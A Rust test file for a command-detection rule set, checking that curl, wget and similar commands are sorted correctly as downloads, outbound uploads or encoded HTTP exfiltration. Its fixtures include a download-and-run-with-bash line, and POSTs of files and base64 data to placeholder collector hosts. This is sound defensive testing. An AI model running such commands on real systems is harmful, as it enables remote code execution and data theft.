//! Tests pinning HTTP direction in the bundled rules: downloads, uploads and
//! encoded transfers each match only their own direction.

use super::{CompiledRuleSet, MatchResult, load_default_rule_set};

const BENIGN_ENCODED_API: &str = "curl --data AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA https://api.example.invalid/test";
const MALICIOUS_ENCODED_HOST: &str =
    "curl https://U1lOVEhFVElDX1BBWUxPQURfUkVQT1JUX0tFWV9CTE9C.example.invalid/collect";
const GENUINE_DOWNLOAD: &str = "curl https://packages.example.invalid/tool.tar.gz";
const FLAGGED_DOWNLOAD: &str =
    "curl -fsSL https://example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh";
const ORDINARY_UPLOAD: &str = "curl -X POST --data-binary @build/synthetic-report.json https://collector.example.invalid/upload";
const ENCODED_WITHOUT_TRANSFER: &str = "printf dGVsbHRhbGUtc3ludGhldGljLWV4ZmlsLW1hcmtlcg==";
const ENCODED_OUTBOUND_POST: &str = "curl --data dGVsbHRhbGUtc3ludGhldGljLWV4ZmlsLW1hcmtlcg== https://collector.example.invalid/upload";
const UNPADDED_ALNUM_POST: &str = "curl --data U1lOVEhFVElDX1BBWUxPQURfUkVQT1JUX0tFWV9CTE9C https://collector.example.invalid/upload";
const OUTPUT_BEFORE_URL: &str =
    "curl -o /tmp/tool.tar.gz https://packages.example.invalid/tool.tar.gz";
const COMPACT_POST: &str = "curl -XPOST https://collector.example.invalid/upload";
const SHORT_DATA_UPLOAD: &str = "curl -d token=synthetic https://api.example.invalid/test";
const COMPACT_DATA_UPLOAD: &str = "curl -dfoo https://api.example.invalid/test";
const URL_THEN_DATA: &str = "curl https://api.example.invalid/test --data AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
const HEADERED_ENCODED_HOST: &str = "curl -H Accept:application/json https://U1lOVEhFVElDX1BBWUxPQURfUkVQT1JUX0tFWV9CTE9C.example.invalid/collect";
const LEADING_SPECIAL_BODY: &str = "curl --data +AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA https://collector.example.invalid/upload";
const URL_THEN_ENCODED_DATA: &str = "curl https://collector.example.invalid/upload --data dGVsbHRhbGUtc3ludGhldGljLWV4ZmlsLW1hcmtlcg==";
const PATH_WITH_DATA_SUBSTRING: &str = "curl https://api.example.invalid/user-data";
const FAIL_FLAG_RETRIEVAL: &str = "curl -f https://packages.example.invalid/tool.tar.gz";
const DUMP_HEADERS_RETRIEVAL: &str = "curl -D- https://packages.example.invalid/tool.tar.gz";
const FORM_UPLOAD: &str = "curl --form payload=@synthetic https://api.example.invalid/upload";
const COMPACT_FORM_UPLOAD: &str = "curl -Fpayload=@synthetic https://api.example.invalid/upload";
const OBJECT_STORE_UPLOAD: &str = "aws s3 cp dist/app.tar.gz s3://example-invalid/artifacts/";
const UPLOAD_FILE: &str =
    "curl --upload-file synthetic.bin https://collector.example.invalid/upload";
const EXPLICIT_PUT: &str = "curl -X PUT synthetic.bin https://collector.example.invalid/upload";
const REQUEST_PUT: &str = "curl --request PUT https://collector.example.invalid/upload";
const METHOD_POST: &str = "curl --method=post https://collector.example.invalid/upload";
const TAB_SEPARATED_POST: &str = "curl -X\tpost https://collector.example.invalid/upload";
const CROSS_SEGMENT_PUT: &str = "curl https://203.0.113.10/; PUT body";
const CROSS_SEGMENT_DATA: &str = "curl https://203.0.113.10/ | something -d @file";
const SAME_SEGMENT_PUT: &str = "curl -X PUT https://203.0.113.10/upload";
const SAME_SEGMENT_DATA: &str = "curl -d @file https://203.0.113.10/upload";
const DUMP_HEADER_FILE: &str = "curl -D headers https://203.0.113.10/file";
const PROXY_NOT_METHOD: &str = "curl -x http://203.0.113.10:8080 https://203.0.113.9/file";
const LOOPBACK_ONLY: &str = "curl http://127.0.0.1/x";
const LOOPBACK_PROXY: &str = "curl -x http://203.0.113.10:8080 http://127.0.0.1/x";
const LOOPBACK_POST: &str = "curl -X POST --data @f http://127.0.0.1/x";
const LOCALHOST_DOWNLOAD: &str = "curl http://localhost/x";
const MIXED_LOOPBACK: &str = "curl http://127.0.0.1/x http://203.0.113.10/y";

fn bundled() -> CompiledRuleSet {
    load_default_rule_set().expect("bundled rules")
}

fn evaluate(fields: &[(&str, &str)]) -> Option<MatchResult> {
    bundled().evaluate(fields).expect("evaluate")
}

fn ids(result: &MatchResult) -> Vec<String> {
    result.rule_ids.clone()
}

fn has_rule(result: &MatchResult, rule_id: &str) -> bool {
    result.rule_ids.iter().any(|id| id == rule_id)
}

fn contribution_total(result: &MatchResult) -> u64 {
    result.contributions.iter().map(|item| item.points()).sum()
}

#[test]
fn benign_encoded_api_stays_below_review_without_download_or_encoded_http() {
    let result = evaluate(&[("arguments", BENIGN_ENCODED_API)]).expect("match");
    assert!(
        has_rule(&result, "exfil.outbound_upload"),
        "outbound POST remains an upload signal: {:?}",
        ids(&result)
    );
    assert!(
        !has_rule(&result, "network.download"),
        "upload-shaped curl is not a download: {:?}",
        ids(&result)
    );
    assert!(
        !has_rule(&result, "exfil.encoded_http"),
        "sixty identical letters are not encoded HTTP: {:?}",
        ids(&result)
    );
    assert_eq!(result.score, 60);
    assert!(result.score < 70);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn malicious_encoded_hostname_still_matches_encoded_http_and_download() {
    let result = evaluate(&[("arguments", MALICIOUS_ENCODED_HOST)]).expect("match");
    assert!(
        has_rule(&result, "exfil.encoded_http"),
        "encoded hostname GET must remain encoded HTTP: {:?}",
        ids(&result)
    );
    assert!(
        has_rule(&result, "network.download"),
        "GET retrieval remains a download: {:?}",
        ids(&result)
    );
    assert!(
        !has_rule(&result, "exfil.outbound_upload"),
        "GET without upload flags is not outbound upload: {:?}",
        ids(&result)
    );
    assert!(result.score >= 70);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn genuine_curl_get_matches_download_not_upload() {
    let result = evaluate(&[("arguments", GENUINE_DOWNLOAD)]).expect("match");
    assert!(has_rule(&result, "network.download"));
    assert!(!has_rule(&result, "exfil.outbound_upload"));
    assert!(!has_rule(&result, "exfil.encoded_http"));
    assert_eq!(result.score, 20);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn short_flag_retrieval_still_matches_download() {
    let result = evaluate(&[("arguments", FLAGGED_DOWNLOAD)]).expect("match");
    assert!(
        has_rule(&result, "network.download"),
        "curl -fsSL -o retrieval must remain a download: {:?}",
        ids(&result)
    );
    assert!(!has_rule(&result, "exfil.outbound_upload"));
}

#[test]
fn ordinary_curl_post_matches_upload_not_download() {
    let result = evaluate(&[("arguments", ORDINARY_UPLOAD)]).expect("match");
    assert!(has_rule(&result, "exfil.outbound_upload"));
    assert!(
        !has_rule(&result, "network.download"),
        "POST --data-binary is not a download: {:?}",
        ids(&result)
    );
    assert!(!has_rule(&result, "exfil.encoded_http"));
    assert_eq!(result.score, 60);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn object_store_copy_matches_upload_independently() {
    for command in [
        OBJECT_STORE_UPLOAD,
        "AWS s3 cp dist/app.tar.gz s3://example-invalid/artifacts/",
    ] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert_eq!(ids(&result), vec!["exfil.outbound_upload".to_string()]);
        assert_eq!(result.score, 60);
        assert_eq!(result.score, contribution_total(&result));
    }
}

#[test]
fn encoding_without_http_client_does_not_imply_download_or_upload() {
    let result = evaluate(&[("arguments", ENCODED_WITHOUT_TRANSFER)]);
    if let Some(result) = result {
        assert!(
            !has_rule(&result, "exfil.encoded_http"),
            "encoding without an HTTP client is not encoded HTTP: {:?}",
            ids(&result)
        );
        assert!(!has_rule(&result, "network.download"));
        assert!(!has_rule(&result, "exfil.outbound_upload"));
    }
}

#[test]
fn encoded_body_and_outbound_upload_remain_additive() {
    let result = evaluate(&[("arguments", ENCODED_OUTBOUND_POST)]).expect("match");
    assert!(
        has_rule(&result, "exfil.encoded_http"),
        "valid padded base64 body must remain encoded HTTP: {:?}",
        ids(&result)
    );
    assert!(
        has_rule(&result, "exfil.outbound_upload"),
        "curl --data remains outbound upload: {:?}",
        ids(&result)
    );
    assert!(
        !has_rule(&result, "network.download"),
        "encoded POST is not a download: {:?}",
        ids(&result)
    );
    assert_eq!(result.score, 110);
    assert_eq!(result.score, contribution_total(&result));
    assert!(result.score >= 70);
}

#[test]
fn unpadded_alphanumeric_post_is_upload_only_below_review() {
    let result = evaluate(&[("arguments", UNPADDED_ALNUM_POST)]).expect("match");
    assert!(has_rule(&result, "exfil.outbound_upload"));
    assert!(
        !has_rule(&result, "exfil.encoded_http"),
        "unpadded alphanumeric bodies stay in the same class as the benign token: {:?}",
        ids(&result)
    );
    assert!(!has_rule(&result, "network.download"));
    assert_eq!(result.score, 60);
    assert!(result.score < 70);
}

#[test]
fn output_flag_before_url_still_matches_download() {
    let result = evaluate(&[("arguments", OUTPUT_BEFORE_URL)]).expect("match");
    assert!(
        has_rule(&result, "network.download"),
        "curl -o <file> URL is retrieval: {:?}",
        ids(&result)
    );
    assert!(!has_rule(&result, "exfil.outbound_upload"));
}

#[test]
fn compact_post_and_short_data_are_upload_not_download() {
    for command in [
        COMPACT_POST,
        SHORT_DATA_UPLOAD,
        COMPACT_DATA_UPLOAD,
        URL_THEN_DATA,
    ] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert!(
            has_rule(&result, "exfil.outbound_upload"),
            "{command} should be outbound upload: {:?}",
            ids(&result)
        );
        assert!(
            !has_rule(&result, "network.download"),
            "{command} must not be classified as download: {:?}",
            ids(&result)
        );
        assert!(!has_rule(&result, "exfil.encoded_http"));
        assert_eq!(result.score, 60);
        assert_eq!(result.score, contribution_total(&result));
    }
}

#[test]
fn headered_encoded_hostname_get_still_reaches_review() {
    let result = evaluate(&[("arguments", HEADERED_ENCODED_HOST)]).expect("match");
    assert!(
        has_rule(&result, "exfil.encoded_http"),
        "headered encoded-host GET must remain encoded HTTP: {:?}",
        ids(&result)
    );
    assert!(
        has_rule(&result, "network.download"),
        "headered GET retrieval remains a download: {:?}",
        ids(&result)
    );
    assert!(!has_rule(&result, "exfil.outbound_upload"));
    assert!(result.score >= 70);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn leading_base64_special_in_body_is_encoded_http() {
    let result = evaluate(&[("arguments", LEADING_SPECIAL_BODY)]).expect("match");
    assert!(
        has_rule(&result, "exfil.encoded_http"),
        "a leading + in a long body is encoding evidence: {:?}",
        ids(&result)
    );
    assert!(has_rule(&result, "exfil.outbound_upload"));
    assert!(!has_rule(&result, "network.download"));
    assert_eq!(result.score, 110);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn url_then_encoded_data_stays_encoded_upload_not_download() {
    let result = evaluate(&[("arguments", URL_THEN_ENCODED_DATA)]).expect("match");
    assert!(has_rule(&result, "exfil.encoded_http"));
    assert!(has_rule(&result, "exfil.outbound_upload"));
    assert!(!has_rule(&result, "network.download"));
    assert_eq!(result.score, 110);
    assert!(result.score >= 70);
    assert_eq!(result.score, contribution_total(&result));
}

#[test]
fn path_substring_data_is_not_outbound_upload() {
    let result = evaluate(&[("arguments", PATH_WITH_DATA_SUBSTRING)]).expect("match");
    assert!(has_rule(&result, "network.download"));
    assert!(
        !has_rule(&result, "exfil.outbound_upload"),
        "user-data in a URL path is not curl -d: {:?}",
        ids(&result)
    );
    assert_eq!(result.score, 20);
}

#[test]
fn fail_flag_retrieval_is_not_form_upload() {
    let result = evaluate(&[("arguments", FAIL_FLAG_RETRIEVAL)]).expect("match");
    assert!(has_rule(&result, "network.download"));
    assert!(
        !has_rule(&result, "exfil.outbound_upload"),
        "curl -f is --fail, not -F form upload: {:?}",
        ids(&result)
    );
    assert_eq!(result.score, 20);
}

#[test]
fn dump_headers_flag_retrieval_is_not_data_upload() {
    let result = evaluate(&[("arguments", DUMP_HEADERS_RETRIEVAL)]).expect("match");
    assert!(has_rule(&result, "network.download"));
    assert!(!has_rule(&result, "exfil.outbound_upload"));
    assert_eq!(result.score, 20);
}

#[test]
fn form_upload_is_upload_not_download() {
    for command in [FORM_UPLOAD, COMPACT_FORM_UPLOAD] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert!(has_rule(&result, "exfil.outbound_upload"), "{command}");
        assert!(!has_rule(&result, "network.download"), "{command}");
        assert_eq!(result.score, 60);
    }
}

#[test]
fn upload_file_and_explicit_methods_are_upload_not_download() {
    for command in [
        UPLOAD_FILE,
        EXPLICIT_PUT,
        REQUEST_PUT,
        METHOD_POST,
        TAB_SEPARATED_POST,
    ] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert!(has_rule(&result, "exfil.outbound_upload"), "{command}");
        assert!(!has_rule(&result, "network.download"), "{command}");
    }
}

#[test]
fn http_flags_match_only_in_the_client_segment() {
    for command in [
        CROSS_SEGMENT_PUT,
        CROSS_SEGMENT_DATA,
        DUMP_HEADER_FILE,
        PROXY_NOT_METHOD,
    ] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert!(
            has_rule(&result, "network.download"),
            "{command} should remain a download: {:?}",
            ids(&result)
        );
        assert!(
            !has_rule(&result, "exfil.outbound_upload"),
            "{command} is not same-segment exfil: {:?}",
            ids(&result)
        );
        assert_eq!(result.score, 20, "{command}");
    }
    for command in [SAME_SEGMENT_PUT, SAME_SEGMENT_DATA] {
        let result = evaluate(&[("arguments", command)]).expect("match");
        assert!(
            has_rule(&result, "exfil.outbound_upload"),
            "{command} should be exfil: {:?}",
            ids(&result)
        );
        assert!(
            !has_rule(&result, "network.download"),
            "{command} is not a download: {:?}",
            ids(&result)
        );
        assert_eq!(result.score, 60, "{command}");
    }
}

/// The session HTTP-direction contract: `(command, upload, download)`.
const DIRECTION_TABLE: &[(&str, bool, bool)] = &[
    // A quoted `;`, `|` or `&&` stays inside its command segment.
    (
        "curl https://example.invalid/upload -H 'X-Synthetic: a;b' --data @f",
        true,
        false,
    ),
    (
        "curl https://example.invalid/upload -H \"X-Synthetic: a|b\" -d @f",
        true,
        false,
    ),
    (
        "curl -H 'Content-Type: application/json; charset=utf-8' --data @f https://example.invalid/upload",
        true,
        false,
    ),
    // An escaped quote, `$'...'` quoting or a continued line keeps the command
    // whole, and a backslash a Windows shell keeps as text still closes a quote.
    (
        "curl -H \"X-Synthetic: a\\\"b\" --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H \"X-Synthetic: a\\\";b\" --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H $'X-Synthetic: a\\';b' --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H 'X-Synthetic: a' \\\n  --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H \"X-Synthetic: a\\\"b\" -o out https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl -H \"X-Synthetic: a\\\";b\" -o out https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl -H $'X-Synthetic: a\\';b' -o out https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl -sS \\\n  https://example.invalid/file -o out",
        false,
        true,
    ),
    // Each reading is whole, so no flag is found by closing a quote one way and
    // escaping the next one the other.
    (
        "curl https://example.invalid/file -o out -H \"X-Synthetic: \\\"a\\\" -d b\"",
        false,
        true,
    ),
    (
        "curl https://example.invalid/file -o out -H \"X-Synthetic: \\\"a\\\" --data b\"",
        false,
        true,
    ),
    (
        "curl https://example.invalid/file -o out -H \"a\\\" \\' --data y '\"",
        false,
        true,
    ),
    // `$$` is a parameter, and `\$` a dollar sign, so neither opens `$'...'`.
    (
        "curl https://example.invalid/file -o out $$'\\' x '  --data y '",
        false,
        true,
    ),
    (
        "curl https://example.invalid/file -o out \\$'\\' x '  --data y '",
        false,
        true,
    ),
    // The client's name may run straight into a redirect, a quote or a continued
    // line, and a single `&` into a parameter.
    (
        "curl>/dev/null --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl'' --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "wget>log --post-data=x https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl\\\n --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl https://example.invalid/upload 2>&$fd --data @f",
        true,
        false,
    ),
    // A Windows shell keeps a backslash as text, so a download's quote closes there.
    (
        "iwr -OutFile \"C:\\tmp\\\" https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl -H \"X-Synthetic: a|b\" --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H 'X-Synthetic: a&&b' --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -H 'X-Synthetic: a;b' https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl -H 'X-Synthetic: a|b' https://example.invalid/file; other --data @f",
        false,
        true,
    ),
    (
        "curl -H 'X-Synthetic: --data @f' https://example.invalid/file",
        false,
        true,
    ),
    (
        "curl https://example.invalid/file && other --data @f",
        false,
        true,
    ),
    (
        "curl https://example.invalid/file\nother --data @f",
        false,
        true,
    ),
    // `network.download` is segment-scoped: an upload in another segment does
    // not hide a download, and an upload in the same segment still excludes it.
    (
        "curl --data @f https://example.invalid/upload; curl https://example.invalid/file",
        true,
        true,
    ),
    (
        "curl https://example.invalid/file | curl --data @- https://example.invalid/upload",
        true,
        true,
    ),
    (
        "curl -sX POST https://example.invalid/upload && wget https://example.invalid/file",
        true,
        true,
    ),
    (
        "curl https://example.invalid/file -o f 2>&1 --data @f",
        true,
        false,
    ),
    // A single `&` stays in one lexical segment, including when it is a shell
    // background operator. The later upload still excludes this download.
    (
        "curl -o out https://example.invalid/file & curl -T file https://example.invalid/upload",
        true,
        false,
    ),
    // Short flags are case-sensitive and may be clustered.
    ("curl -sX POST https://example.invalid/upload", true, false),
    ("curl -sXPUT https://example.invalid/upload", true, false),
    ("curl -X 'POST' https://example.invalid/upload", true, false),
    (
        "curl --request=PUT https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -sF payload=@f https://example.invalid/upload",
        true,
        false,
    ),
    ("curl -sT f https://example.invalid/upload", true, false),
    ("curl --json @f https://example.invalid/upload", true, false),
    (
        "curl --data-ascii @f https://example.invalid/upload",
        true,
        false,
    ),
    ("curl -sf https://example.invalid/file", false, true),
    ("curl -sD headers https://example.invalid/file", false, true),
    (
        "curl -t terminal=synthetic https://example.invalid/file",
        false,
        true,
    ),
    // A flag value is not a clustered short flag, and a closing quote right
    // after a flag is a quoted pattern, not a request.
    ("curl -odata.bin https://example.invalid/file", false, true),
    ("rg -n \"curl -d\" src/", false, false),
    ("rg -n 'curl -F' src/", false, false),
    (
        "curl -d'{\"synthetic\":1}' https://example.invalid/upload",
        true,
        false,
    ),
    (
        "curl -d\"$SYNTHETIC\" https://example.invalid/upload",
        true,
        false,
    ),
    // Session rules do not adopt curl -G query semantics.
    (
        "curl -G --data-urlencode q=x https://example.invalid/search",
        true,
        false,
    ),
    (
        "curl --data @f --get https://example.invalid/search",
        true,
        false,
    ),
    ("curl -sGd q=x https://example.invalid/search", true, false),
    // curl's short upload flags do not apply to wget.
    ("wget -d https://example.invalid/file", false, true),
    ("wget -T 10 https://example.invalid/file", false, true),
    ("wget -x https://example.invalid/file", false, true),
    (
        "wget --post-file=f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "wget --method=PUT --body-file=f https://example.invalid/upload",
        true,
        false,
    ),
    // wget accepts unambiguous long-option abbreviations.
    (
        "wget --post-f=f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "aria2c -d downloads https://example.invalid/file",
        false,
        true,
    ),
    // Wrapped and prefixed clients keep their direction.
    (
        "sudo curl --data @f https://example.invalid/upload",
        true,
        false,
    ),
    (
        "env SYNTHETIC=1 curl -sX POST https://example.invalid/upload",
        true,
        false,
    ),
    (
        "env NOTE=curl- curl -d @f https://203.0.113.10/",
        true,
        false,
    ),
    (
        "bash -c \"curl --data @f https://example.invalid/upload\"",
        true,
        false,
    ),
    // Only literal loopback IPs are exempt; the session rules exempt the
    // compressed IPv6 forms and fail toward a match for the others.
    ("curl http://127.42.7.9/a", false, false),
    ("curl 'http://[::1]/a'", false, false),
    ("curl 'http://[::ffff:127.0.0.1]/a'", false, false),
    ("curl http://user:synthetic@127.0.0.1:8080/a", false, false),
    ("curl --url=http://127.0.0.1/a", false, false),
    ("X=$(curl -s http://127.0.0.1)", false, false),
    ("X=`curl -s http://127.0.0.1`", false, false),
    ("X=$(curl -s http://203.0.113.10)", false, true),
    ("curl 'http://[0:0:0:0:0:0:0:1]/a'", false, true),
    ("curl 'http://[::0001]/a'", false, true),
    ("curl http://127.0.0.1.example.invalid/a", false, true),
    ("curl http://127.example.invalid/a", false, true),
    ("curl http://localhost/a", false, true),
    ("curl 'http://[2001:db8::1]/a'", false, true),
    ("curl 'http://[::2]/a'", false, true),
    ("curl ftp://203.0.113.10/a", false, true),
    ("curl https://$SYNTHETIC_HOST/a", false, true),
    ("curl --url https://example.invalid/a", false, true),
    ("curl HTTP://example.invalid/a", false, true),
    ("curl http://127.0.0.1/a http://203.0.113.10/b", false, true),
    ("curl http://203.0.113.10/b http://127.0.0.1/a", false, true),
    // A proxy or reroute flag counts only together with a URL.
    (
        "curl --proxy socks5://proxy.example.invalid:1080 http://127.0.0.1/a",
        false,
        true,
    ),
    (
        "curl http://127.0.0.1/a --resolve 127.0.0.1:80:203.0.113.10",
        false,
        true,
    ),
    (
        "curl --connect-to 127.0.0.1:80:example.invalid:80 http://127.0.0.1/a",
        false,
        true,
    ),
    (
        "curl --preproxy socks5://proxy.example.invalid:1080 http://127.0.0.1/a",
        false,
        true,
    ),
    (
        "curl -sx proxy.example.invalid:1080 http://127.0.0.1/a",
        false,
        true,
    ),
    ("curl -x proxy.example.invalid:1080", false, false),
    (
        "curl --proxy socks5://proxy.example.invalid:1080",
        false,
        false,
    ),
    (
        "curl --resolve example.invalid:80:203.0.113.10",
        false,
        false,
    ),
    (
        "curl http://127.0.0.1/a; other --proxy http://proxy.example.invalid:8080",
        false,
        false,
    ),
    // Without lookaround, a session regex cannot tell a proxy's own URL
    // argument from a target URL, so a non-loopback proxy URL still counts.
    // Native actions parse the argument and do not count it.
    ("curl -x http://203.0.113.10:8080", false, true),
    (
        "curl --proxy=http://proxy.example.invalid:8080",
        false,
        true,
    ),
    // Known session limits that fail toward a match; native actions are
    // exact. A single-quoted wrapper shifts which quotes the upload regex sees
    // as open, and `-x` is read as a reroute for every client. The download
    // is decided in its own segment, so it still counts.
    (
        "sh -c 'curl -sS https://example.invalid/x' && echo 'x -d y'",
        true,
        true,
    ),
    ("wget -x http://127.0.0.1/a", false, true),
    // Text that only mentions a client is not a request.
    (
        "rg -n \"curl https://|wget https://\" scripts/",
        false,
        false,
    ),
];

/// Bundled rules with the two HTTP rules renamed, to prove no rule ID selects
/// hidden semantics.
fn forked() -> CompiledRuleSet {
    let document = super::DEFAULT_RULE_YAML
        .replace("network.download", "fork.network.download")
        .replace("exfil.outbound_upload", "fork.exfil.outbound_upload");
    super::load_rule_set_from_documents(&[&document], None).expect("forked rules")
}

fn direction(
    rules: &CompiledRuleSet,
    prefix: &str,
    field: &str,
    command: &str,
) -> (bool, bool, u64) {
    let result = rules.evaluate(&[(field, command)]).expect("evaluate");
    let matched = |id: &str| {
        result
            .as_ref()
            .is_some_and(|result| has_rule(result, &format!("{prefix}{id}")))
    };
    if let Some(result) = &result {
        assert_eq!(
            result.score,
            contribution_total(result),
            "{field}: {command}"
        );
    }
    (
        matched("exfil.outbound_upload"),
        matched("network.download"),
        result.map_or(0, |result| result.score),
    )
}

#[test]
fn session_http_direction_follows_the_segment_contract() {
    let rules = bundled();
    for &(command, upload, download) in DIRECTION_TABLE {
        for field in ["command", "arguments", "url"] {
            let (got_upload, got_download, _) = direction(&rules, "", field, command);
            assert_eq!(got_upload, upload, "upload {field}: {command}");
            assert_eq!(got_download, download, "download {field}: {command}");
        }
    }
}

#[test]
fn renamed_http_rules_match_exactly_like_the_bundled_rules() {
    let (rules, fork) = (bundled(), forked());
    for &(command, _, _) in DIRECTION_TABLE {
        for field in ["command", "arguments", "url"] {
            assert_eq!(
                direction(&fork, "fork.", field, command),
                direction(&rules, "", field, command),
                "{field}: {command}"
            );
        }
    }
}

#[test]
fn upload_flags_veto_a_download_only_in_their_own_segment() {
    // `network.download` declares `scope: segment`, so its upload exclusion
    // applies to the segment the download selection matched, not the field.
    let separate = evaluate(&[(
        "command",
        "curl --data @f https://example.invalid/upload; curl https://example.invalid/file",
    )])
    .expect("match");
    assert_eq!(
        ids(&separate),
        ["network.download", "exfil.outbound_upload"]
    );
    assert_eq!(separate.score, 80);
    assert_eq!(separate.score, contribution_total(&separate));

    let same = evaluate(&[(
        "command",
        "curl --data @f https://example.invalid/upload https://example.invalid/file",
    )])
    .expect("match");
    assert_eq!(ids(&same), ["exfil.outbound_upload"]);
    assert_eq!(same.score, 60);

    // Without the declared scope the same predicates veto the whole field.
    let bundled = super::DEFAULT_RULE_YAML.replace("\r\n", "\n");
    for newline in ["\n", "\r\n"] {
        let document = bundled.replace('\n', newline).replace("\r\n", "\n");
        assert_eq!(document.matches("      scope: segment\n").count(), 1);
        let document = document.replace("      scope: segment\n", "");
        assert!(!document.contains("      scope: segment"));
        let document = document.replace('\n', newline);
        let field = super::load_rule_set_from_documents(&[&document], None)
            .expect("field-scoped rules")
            .evaluate(&[(
                "command",
                "curl --data @f https://example.invalid/upload; curl https://example.invalid/file",
            )])
            .expect("evaluate")
            .expect("match");
        assert_eq!(ids(&field), ["exfil.outbound_upload"]);
    }
}

#[test]
fn literal_loopback_urls_are_not_downloads_unless_rerouted_or_mixed() {
    let absent = evaluate(&[("arguments", LOOPBACK_ONLY)]);
    if let Some(result) = &absent {
        assert!(
            !has_rule(result, "network.download"),
            "literal loopback is not a download: {:?}",
            ids(result)
        );
        assert!(
            !has_rule(result, "exfil.outbound_upload"),
            "literal loopback GET is not exfil: {:?}",
            ids(result)
        );
    }

    let proxied = evaluate(&[("arguments", LOOPBACK_PROXY)]).expect("match");
    assert!(
        has_rule(&proxied, "network.download"),
        "proxy flag keeps the loopback URL a download: {:?}",
        ids(&proxied)
    );
    assert!(!has_rule(&proxied, "exfil.outbound_upload"));
    assert_eq!(proxied.score, 20);

    let posted = evaluate(&[("arguments", LOOPBACK_POST)]).expect("match");
    assert!(
        has_rule(&posted, "exfil.outbound_upload"),
        "loopback POST still matches exfil: {:?}",
        ids(&posted)
    );
    assert!(
        !has_rule(&posted, "network.download"),
        "loopback POST is not a download: {:?}",
        ids(&posted)
    );
    assert_eq!(posted.score, 60);

    let local = evaluate(&[("arguments", LOCALHOST_DOWNLOAD)]).expect("match");
    assert!(
        has_rule(&local, "network.download"),
        "localhost is not literal loopback: {:?}",
        ids(&local)
    );
    assert!(!has_rule(&local, "exfil.outbound_upload"));
    assert_eq!(local.score, 20);

    let mixed = evaluate(&[("arguments", MIXED_LOOPBACK)]).expect("match");
    assert!(
        has_rule(&mixed, "network.download"),
        "a non-loopback URL keeps the download: {:?}",
        ids(&mixed)
    );
    assert!(!has_rule(&mixed, "exfil.outbound_upload"));
    assert_eq!(mixed.score, 20);
}
